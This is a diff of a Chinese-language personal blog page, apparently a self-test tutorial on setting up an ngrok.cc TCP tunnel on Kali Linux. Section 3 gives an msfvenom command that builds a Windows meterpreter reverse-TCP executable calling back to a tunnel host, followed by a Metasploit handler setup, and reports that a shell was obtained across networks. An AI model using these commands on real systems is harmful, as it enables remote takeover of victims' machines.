@@ -1,285 +1,471 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="作为内网用户我们有时需要本地WEB外网访问、本地开发微信、TCP端口转发，而ngrok能提供web的演示">
-<meta property="og:type" content="article">
-<meta property="og:title" content="vps配置ngrok反向代理">
-<meta property="og:url" content="https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/index.html">
-<meta property="og:site_name" content="Alpha的小站">
-<meta property="og:description" content="作为内网用户我们有时需要本地WEB外网访问、本地开发微信、TCP端口转发，而ngrok能提供web的演示">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVTv8QqMMKzoLaVACw_-LoVU-4q8fTZhMIn0mke_2019-09-11%2008-08-21%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVUXCTyxmLvOZFFRb1_-LoVUnBGBgOxzNjbHIW1_QQ%E5%9B%BE%E7%89%8720190911201909.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoV%40IG.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVI_LuEGMO4yZbsh8_-LoVVO3UyeLRO-Xnm4YI_Inked2019-09-11%2008-33-47%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_LI.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVTv2GyLgE9_tkQm4_-LoVVoKcjVmGXJ.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fczE%24I.png">
-<meta property="article:published_time" content="2019-09-13T14:34:39.000Z">
-<meta property="article:modified_time" content="2019-11-13T15:01:13.981Z">
-<meta property="article:author" content="wang">
-<meta property="article:tag" content="vps">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVTv8QqMMKzoLaVACw_-LoVU-4q8fTZhMIn0mke_2019-09-11%2008-08-21%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>vps配置ngrok反向代理</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="够努力才会越幸运">
+  <meta name="author" content="wang">
+  <meta name="keywords" content="Linux,CTF,漏洞复现,环境搭建,工具使用">
+  <title>vps配置ngrok反向代理 - Alpha的小站</title>
 
-    <!-- rss -->
-    
-    
-<meta name="generator" content="Hexo 5.1.1"></head>
-
-<body class="max-width mx-auto px3">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/archives">Writing</a></li>
-         
-          <li><a href="/music">Music</a></li>
-         
-          <li><a href="/about">关于</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/09/27/hexo%E4%BC%98%E5%8C%96/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/03/27/Netcat/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/&text=vps配置ngrok反向代理"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/&title=vps配置ngrok反向代理"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/&is_video=false&description=vps配置ngrok反向代理"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=vps配置ngrok反向代理&body=Check out this article: https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/&title=vps配置ngrok反向代理"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/&title=vps配置ngrok反向代理"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/&title=vps配置ngrok反向代理"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/&title=vps配置ngrok反向代理"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://alpha302.github.io/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/&name=vps配置ngrok反向代理&description=&lt;p&gt;作为内网用户我们有时需要本地WEB外网访问、本地开发微信、TCP端口转发，而ngrok能提供web的演示&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B5%B7%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">1 起因:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9B%B4%E6%8D%A2ngrok-cc%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.</span> <span class="toc-text">2 更换ngrok.cc的客户端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E5%BC%80%E9%80%9A%E4%B8%80%E4%B8%AA%E5%85%8D%E8%B4%B9%E7%9A%84%E9%9A%A7%E9%81%93%E3%80%82"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 开通一个免费的隧道。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E5%BC%80%E9%80%9A%E4%BD%A0%E7%9A%84%E9%9A%A7%E9%81%93"><span class="toc-number">2.2.</span> <span class="toc-text">2.2  开通你的隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3%E7%AE%A1%E7%90%86%E9%9A%A7%E9%81%93"><span class="toc-number">2.3.</span> <span class="toc-text">2.3管理隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-kali%E4%B8%8B%E5%AE%89%E8%A3%85%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%8B%E8%AF%95"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 kali下安装客户端测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B5%8B%E8%AF%95metasploit%E7%BB%93%E5%90%88ngrok%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">3 测试metasploit结合ngrok内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%EF%BC%88%E6%9C%AA%E5%85%8D%E6%9D%80%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 生成木马（未免杀）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E4%BD%BF%E7%94%A8Metasploit%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 使用Metasploit进行测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%AB%AF%E5%8F%A3%E9%80%89%E6%8B%A9"><span class="toc-number">4.</span> <span class="toc-text">4 端口选择</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index my4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        vps配置ngrok反向代理
-    </h1>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
 
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">Alpha的小站</span>
-      </span>
+  
+    
+    
       
-    <div class="postdate">
-        <time datetime="2019-09-13T14:34:39.000Z" itemprop="datePublished">2019-09-13</time>
-    </div>
-
-
-      
-    <span class="article-categories">
-        分类：<a class="category-link" href="/categories/vps/">vps</a>
-    </span>
-
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link-link" href="/tags/vps/" rel="tag">vps</a>
-    </div>
-
-
-    </div>
-  </header>
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
   
 
-  <div class="content" itemprop="articleBody">
-    <p>作为内网用户我们有时需要本地WEB外网访问、本地开发微信、TCP端口转发，而ngrok能提供web的演示</p>
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"alpha302.github.io","root":"/","version":"1.8.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="vps配置ngrok反向代理">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-09-13 22:34" pubdate>
+        2019年9月13日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      306 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      3
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vps配置ngrok反向代理</h1>
+            
+            <div class="markdown-body">
+              <p>作为内网用户我们有时需要本地WEB外网访问、本地开发微信、TCP端口转发，而ngrok能提供web的演示</p>
 <a id="more"></a>
 
 <hr>
 <h3 id="1-起因"><a href="#1-起因" class="headerlink" title="1 起因:"></a>1 起因:</h3><p><strong>自己搭建的ngrok挂掉了</strong></p>
-<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVTv8QqMMKzoLaVACw_-LoVU-4q8fTZhMIn0mke_2019-09-11%2008-08-21%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
-<h3 id="2-更换ngrok-cc的客户端"><a href="#2-更换ngrok-cc的客户端" class="headerlink" title="2 更换ngrok.cc的客户端"></a>2 更换ngrok.cc的客户端</h3><h4 id="2-1-开通一个免费的隧道。"><a href="#2-1-开通一个免费的隧道。" class="headerlink" title="2.1 开通一个免费的隧道。"></a>2.1 开通一个免费的隧道。</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVUXCTyxmLvOZFFRb1_-LoVUnBGBgOxzNjbHIW1_QQ%E5%9B%BE%E7%89%8720190911201909.png" alt="选择免费的"></p>
-<h4 id="2-2-开通你的隧道"><a href="#2-2-开通你的隧道" class="headerlink" title="2.2  开通你的隧道"></a>2.2  开通你的隧道</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets.png"></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVTv8QqMMKzoLaVACw_-LoVU-4q8fTZhMIn0mke_2019-09-11%2008-08-21%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" srcset="/img/loading.gif"></p>
+<h3 id="2-更换ngrok-cc的客户端"><a href="#2-更换ngrok-cc的客户端" class="headerlink" title="2 更换ngrok.cc的客户端"></a>2 更换ngrok.cc的客户端</h3><h4 id="2-1-开通一个免费的隧道。"><a href="#2-1-开通一个免费的隧道。" class="headerlink" title="2.1 开通一个免费的隧道。"></a>2.1 开通一个免费的隧道。</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVUXCTyxmLvOZFFRb1_-LoVUnBGBgOxzNjbHIW1_QQ%E5%9B%BE%E7%89%8720190911201909.png" srcset="/img/loading.gif" alt="选择免费的"></p>
+<h4 id="2-2-开通你的隧道"><a href="#2-2-开通你的隧道" class="headerlink" title="2.2  开通你的隧道"></a>2.2  开通你的隧道</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets.png" srcset="/img/loading.gif"></p>
 <p>隧道协议选tcp，之后要用metasploit结合ngrok</p>
 <p>隧道名称随意</p>
 <p>端口选择只要不是服务器端口就好</p>
 <p>本地端口选择kali 的内网地址</p>
-<h4 id="2-3管理隧道"><a href="#2-3管理隧道" class="headerlink" title="2.3管理隧道"></a>2.3管理隧道</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoV%40IG.png"></p>
+<h4 id="2-3管理隧道"><a href="#2-3管理隧道" class="headerlink" title="2.3管理隧道"></a>2.3管理隧道</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoV%40IG.png" srcset="/img/loading.gif"></p>
 <p>下载客户端</p>
 <p>记录好隧道id</p>
 <h4 id="2-4-kali下安装客户端测试"><a href="#2-4-kali下安装客户端测试" class="headerlink" title="2.4 kali下安装客户端测试"></a>2.4 kali下安装客户端测试</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装路径下执行</span></span><br><span class="line">root@kali:~<span class="comment"># ./sunny clientid id</span></span><br><span class="line"><span class="comment">#出现online表明成功</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVI_LuEGMO4yZbsh8_-LoVVO3UyeLRO-Xnm4YI_Inked2019-09-11%2008-33-47%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_LI.jpg"></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVI_LuEGMO4yZbsh8_-LoVVO3UyeLRO-Xnm4YI_Inked2019-09-11%2008-33-47%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_LI.jpg" srcset="/img/loading.gif"></p>
 <p>现在可以启用web，打开127.0.0.1:4040查看管理。需要设置apache2的端口为端口为kali内的端口，开启apache2的服务</p>
 <h3 id="3-测试metasploit结合ngrok内网穿透"><a href="#3-测试metasploit结合ngrok内网穿透" class="headerlink" title="3 测试metasploit结合ngrok内网穿透"></a>3 测试metasploit结合ngrok内网穿透</h3><h4 id="3-1-生成木马（未免杀）"><a href="#3-1-生成木马（未免杀）" class="headerlink" title="3.1 生成木马（未免杀）"></a>3.1 生成木马（未免杀）</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.idcfen*** LPORT=<span class="number">123</span>** -f exe &gt; /root/Desktop/ngrok.exe</span><br></pre></td></tr></table></figure>
 
 <h4 id="3-2-使用Metasploit进行测试"><a href="#3-2-使用Metasploit进行测试" class="headerlink" title="3.2 使用Metasploit进行测试"></a>3.2 使用Metasploit进行测试</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost <span class="number">192.168</span><span class="number">.200</span><span class="number">.128</span>(Kali的Linux内网IP)</span><br><span class="line">set lport <span class="number">1000</span> (隧道的端口号)</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVTv2GyLgE9_tkQm4_-LoVVoKcjVmGXJ.png"></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVTv2GyLgE9_tkQm4_-LoVVoKcjVmGXJ.png" srcset="/img/loading.gif"></p>
 <p>成功获取shell，不同网段。</p>
-<h3 id="4-端口选择"><a href="#4-端口选择" class="headerlink" title="4 端口选择"></a>4 端口选择</h3><p><strong>以下为服务端口，不可用选用</strong><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fczE%24I.png"></p>
+<h3 id="4-端口选择"><a href="#4-端口选择" class="headerlink" title="4 端口选择"></a>4 端口选择</h3><p><strong>以下为服务端口，不可用选用</strong><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fczE%24I.png" srcset="/img/loading.gif"></p>
 
-  </div>
-</article>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/vps/">vps</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/vps/">vps</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/09/27/hexo%E4%BC%98%E5%8C%96/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">主题美化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/03/27/Netcat/">
+                        <span class="hidden-mobile">Netcat</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-
-
+            
+          </article>
+        </div>
+      </div>
     </div>
     
-      <div id="footer-post-container">
-  <div id="footer-post">
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/archives">Writing</a></li>
-         
-          <li><a href="/music">Music</a></li>
-         
-          <li><a href="/about">关于</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B5%B7%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">1 起因:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9B%B4%E6%8D%A2ngrok-cc%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.</span> <span class="toc-text">2 更换ngrok.cc的客户端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E5%BC%80%E9%80%9A%E4%B8%80%E4%B8%AA%E5%85%8D%E8%B4%B9%E7%9A%84%E9%9A%A7%E9%81%93%E3%80%82"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 开通一个免费的隧道。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E5%BC%80%E9%80%9A%E4%BD%A0%E7%9A%84%E9%9A%A7%E9%81%93"><span class="toc-number">2.2.</span> <span class="toc-text">2.2  开通你的隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3%E7%AE%A1%E7%90%86%E9%9A%A7%E9%81%93"><span class="toc-number">2.3.</span> <span class="toc-text">2.3管理隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-kali%E4%B8%8B%E5%AE%89%E8%A3%85%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%8B%E8%AF%95"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 kali下安装客户端测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B5%8B%E8%AF%95metasploit%E7%BB%93%E5%90%88ngrok%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">3 测试metasploit结合ngrok内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%EF%BC%88%E6%9C%AA%E5%85%8D%E6%9D%80%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 生成木马（未免杀）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E4%BD%BF%E7%94%A8Metasploit%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95"><span 